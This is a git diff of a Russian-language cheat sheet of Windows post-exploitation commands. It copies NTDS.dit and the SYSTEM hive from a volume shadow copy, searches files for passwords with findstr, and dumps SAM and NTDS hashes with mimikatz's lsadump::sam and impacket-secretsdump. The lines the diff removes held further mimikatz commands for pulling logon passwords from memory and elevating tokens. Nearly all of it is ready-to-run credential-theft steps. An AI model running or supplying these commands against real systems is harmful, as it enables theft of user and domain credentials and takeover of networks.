@@ -1,19 +1,11 @@
 # Up_windows
 
-
-
-
-
-
-
 Создание теневой копии диска
 
 vssadmin create shadow /for=c:
 
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
-
-
 
 
 Поиск секретов
@@ -27,27 +19,7 @@ cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config
 
 kiwi_cmd lsadump::sam
 
-
-
-https://github.com/gentilkiwi/mimikatz/releases 
-Как извлечь хеш пароля пользователя NTLM из файлов реестра
-
-
-Если есть готвый стянуты файл sam  и system
-.\mimikatz.exe
-lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM
-
-Если из памяти...
-После запуска Mimikatz можно использовать следующие команды для вытягивания паролей из памяти Windows:
-
-- `privilege::debug` - открывает привилегии отладки для текущего процесса.
-- `sekurlsa::logonPasswords` - выводит введенные пользователем логины и хэши паролей.
-- `lsadump::sam` - вытягивает пароли из базы данных SAM.
-- `lsadump::lsa` - вытягивает хэши паролей из дискового хранилища LSA.
-- `token::elevate` - поднимает привилегии на максимальный уровень.
-- `token::whoami` - выводит информацию о текущем пользователе.
-
-
+Распарсить NTDS.DIT
 
 
 impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL >> text распарсить файл ntds.dit
